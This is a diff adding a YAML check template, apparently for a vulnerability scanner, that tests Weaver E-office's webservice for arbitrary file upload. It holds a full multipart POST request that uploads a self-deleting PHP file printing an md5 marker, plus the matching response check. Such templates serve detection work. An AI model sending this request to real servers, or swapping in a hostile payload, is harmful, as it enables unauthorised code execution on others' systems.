@@ -1,0 +1,33 @@
+id:
+
+info:
+  name: 泛微E-office webservice 任意文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /webservice/upload/upload.php
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+    Content-Type: multipart/form-data; boundary=---------------------------10267625012906
+    Accept-Encoding: gzip
+    Connection: close
+  data: |
+    -----------------------------10267625012906
+    Content-Disposition: form-data; name="file"; filename="a.php4"
+    Content-Type: application/octet-stream
+    
+    <?php echo md5(43856);unlink(__FILE__);?>
+    -----------------------------10267625012906--
+response1:
+  headers:
+  body: php4
+  code:
+requests2:
+response2:
+
+
+
+
